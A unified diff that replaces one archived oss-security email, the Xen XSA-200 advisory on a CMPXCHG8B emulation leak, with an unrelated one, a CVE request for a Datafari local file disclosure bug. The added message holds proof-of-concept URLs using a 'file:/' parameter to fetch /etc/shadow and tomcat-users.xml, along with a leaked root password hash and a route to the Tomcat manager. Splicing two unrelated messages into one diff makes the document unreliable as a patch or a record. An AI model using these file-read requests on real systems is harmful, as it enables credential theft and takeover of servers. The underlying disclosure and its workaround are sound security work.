@@ -1,126 +1,84 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/13/2
-Message-Id: <E1cGmoP-00020v-Lw@xenbits.xenproject.org>
-Date: Tue, 13 Dec 2016 13:08:05 +0000
-From: Xen.org security team <security@....org>
-To: xen-announce@...ts.xen.org, xen-devel@...ts.xen.org, xen-users@...ts.xen.org, oss-security@...ts.openwall.com
-CC: Xen.org security team <security@....org>
-Subject: Xen Security Advisory 200 (CVE-2016-9932) - x86 CMPXCHG8B emulation fails to ignore operand size override
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/24/14
+Message-ID: <CANTwUcqY-UXW+M-=urTkqtQLMQ5S6aG+kRKUdP02whyStXrQPQ@mail.gmail.com>
+Date: Wed, 24 Feb 2016 10:00:57 -0500
+From: Fried Wil <wilfried.pascault@...il.com>
+To: oss-security@...ts.openwall.com
+Cc: CVE Assignments MITRE <cve-assign@...re.org>
+Subject: Re: CVE Request: Datafari Local File Disclosure
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Hi,
 
-            Xen Security Advisory CVE-2016-9932 / XSA-200
-                              version 3
+I forgot to add MITRE in cc for CVE assignment.
 
-     x86 CMPXCHG8B emulation fails to ignore operand size override
+Thanks
 
-UPDATES IN VERSION 3
-====================
+On Wed, Feb 3, 2016 at 10:55 AM, PASCAULT Wilfried <wpascault@...si.com> wrote:
+> Datafari, an Open source enterprise search software using Apache Solr, ManifoldCF and Tomcat is proned to a local file disclosure vulnerability.
+>
+> Product's information
+> ---------------------
+> * Name : Datafari - http://www.datafari.com/
+> * Editor: France Labs
+> * Affected versions: 2.x<2.1.3
+> * Tested : 2.1.0 and 2.1.1 on Debian Wheezy 7 and Jesse 8
+>
+> Description
+> -----------
+> When "filesystem" repository has been configured into Datafari (administrative privileges on Datafari required), a user could access to any file of the system with root privileges.
+>
+> On "$INSTALLPATH$/datafari/tomcat/conf/datafari.properties" configuration file, "ALLOWLOCALFILEREADING" parameter allows by default to read file on system.
+>
+> Datafari is by default running as user root, so any file could be downloaded with "url=file:/" parameter in "/Datafari/URL" (token isn't checked).
+>
+> This issue is exploitable only when "Filesystem" repository has been set on ManifoldCF.
+>
+> Proof of concept
+> ----------------
+> http://localhost:8080/Datafari/URL?url=file:/arbitrary_file
+>
+> http://localhost:8080/Datafari/URL?url=file:/etc/shadow
+> => file will be downloaded as _etc_shadow
+>
+> $ head _etc_shadow
+> root:$6$nTTh32TT$rLqcSGDf92tyh9aXtuTqnlGW4Ewr.IzBEcdP/kMnvhNYELz7iUgmOyiWesbJRUwEeKdKk/2yQcnAVBQYBGsiD.:16714:0:99999:7:::
+> daemon:*:16714:0:99999:7:::
+> bin:*:16714:0:99999:7:::
+> sys:*:16714:0:99999:7:::
+> sync:*:16714:0:99999:7:::
+> games:*:16714:0:99999:7:::
+> man:*:16714:0:99999:7:::
+> lp:*:16714:0:99999:7:::
+> mail:*:16714:0:99999:7:::
+> news:*:16714:0:99999:7:::
+>
+> another funny file ^_^ (Tomcat manager password could not be changed during installation)
+> http://localhost:8080/Datafari/URL?url=file://opt/datafari/tomcat/conf/tomcat-users.xml
+> $ cat _opt_datafari_tomcat_conf_tomcat-users.xml|grep admin
+>   <user password="@PASSWORD@" roles="manager-gui,SearchAdministrator" username="admin"/>
+>
+> http://localhost:8080/manager/html/list
+>
+>
+> Workaround
+> ----------
+> Set "ALLOWLOCALFILEREADING=false" on "$INSTALLPATH$/datafari/tomcat/conf/datafari.properties" and restart Datafari
+>
+> Timeline
+> --------
+> 1/6/2016: reported to vendor
+> 1/11/2016: vendor response but said was not a security issue
+> 1/11/2016: add technical details and POC
+> 1/11/2016: vendor acknowledged as a security issue
+> 1/11/2016: patch was commited in master branch
+> 1/28/2016: 2.1.3 released
+>
+> Thanks to Cédric and Aurélien from Datafari project for their quick replies.
 
-CVE assigned.
 
-Public release.
 
-ISSUE DESCRIPTION
-=================
-
-The x86 instruction CMPXCHG8B is supposed to ignore legacy operand
-size overrides; it only honors the REX.W override (making it
-CMPXCHG16B).  So, the operand size is always 8 or 16.
-
-When support for CMPXCHG16B emulation was added to the instruction
-emulator, this restriction on the set of possible operand sizes was
-relied on in some parts of the emulation; but a wrong, fully general,
-operand size value was used for other parts of the emulation.
-
-As a result, if a guest uses a supposedly-ignored operand size prefix,
-a small amount of hypervisor stack data is leaked to the guests: a 96
-bit leak to guests running in 64-bit mode; or, a 32 bit leak to other
-guests.
-
-IMPACT
-======
-
-A malicious unprivileged guest may be able to obtain sensitive
-information from the host.
-
-VULNERABLE SYSTEMS
-==================
-
-Xen versions 3.3 through 4.7 are affected.  Xen master and Xen 4.8 as
-well as Xen versions 3.2 and earlier are not affected.
-
-Only x86 systems are affected.  ARM systems are not affected.
-
-On Xen 4.6 and earlier the vulnerability is exposed to all HVM guest
-user processes, including unprivileged processes.
-
-On Xen 4.7, the vulnerability is exposed only to HVM guest user
-processes granted a degree of privilege (such as direct hardware
-access) by the guest administrator; or, to all user processes when the
-VM has been explicitly configured with a non-default cpu vendor string
-(in xm/xl, this would be done with a `cpuid=' domain config option).
-
-MITIGATION
-==========
-
-There is no known mitigation.
-
-CREDITS
-=======
-
-This issue was discovered by Jan Beulich of SUSE.
-
-RESOLUTION
-==========
-
-Applying the appropriate attached patch resolves this issue.
-
-xsa200-4.7.patch       Xen 4.7.x
-xsa200-4.6.patch       Xen 4.6.x, Xen 4.5.x, Xen 4.4.x
-
-$ sha256sum xsa200*
-820e95e87b838de5eb4158a55c81cf205428f0ed17009dc8d45b2392cf9a0885  xsa200-4.6.patch
-d7113b94f6ef1c2849aedfe33eace85b0713fa83639c8a533fb289aa73e818e8  xsa200-4.7.patch
-$
-
-DEPLOYMENT DURING EMBARGO
-=========================
-
-Deployment of the patches and/or mitigations described above (or
-others which are substantially similar) is permitted during the
-embargo, even on public-facing systems with untrusted guest users and
-administrators.
-
-But: Distribution of updated software is prohibited (except to other
-members of the predisclosure list).
-
-Predisclosure list members who wish to deploy significantly different
-patches and/or mitigations, please contact the Xen Project Security
-Team.
-
-(Note: this during-embargo deployment notice is retained in
-post-embargo publicly released Xen Project advisories, even though it
-is then no longer applicable.  This is to enable the community to have
-oversight of the Xen Project Security Team's decisionmaking.)
-
-For more information about permissible uses of embargoed information,
-consult the Xen Project community's agreed Security Policy:
-  http://www.xenproject.org/security-policy.html
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQEcBAEBAgAGBQJYT/KgAAoJEIP+FMlX6CvZR6QH/0eEM2+9ixdfFAiyhFzn0TTq
-mLgbKs4L0ALfPD2JVhkiLlB/thJ7RKXfPAsYVBQhNY+xb58OLykH4Clh0NuOY45W
-wkWxHeunHAfsNo3FIaISr/uG/5fAnarPsfF+bNYpyWCuWLz4Ml+uuflnfL60PmoP
-OGSPLEPKZ56r9lyaIALFVfkXgHkaquM/WXi+FdG23aArbT43cVHeGou8dUNbH/Jd
-FpKdO3AhMT9i+ioPeicSIimxLOEBZnrCaB/7qOAzu7q3nlQ8X/1Q8a8TjjOtYtQA
-/kOkvpexkQuRA98AI6018ajqU/D5VdFW+I2X0kmbTAxj1SyT12X25f9Wsc0PbdE=
-=ERcI
------END PGP SIGNATURE-----
-
-Download attachment "xsa200-4.6.patch" of type "application/octet-stream" (1935 bytes)
-
-Download attachment "xsa200-4.7.patch" of type "application/octet-stream" (1943 bytes)
+-- 
+Wilfried Pascault
++1 514 430 7201
+wilfried.pascault@...il.com
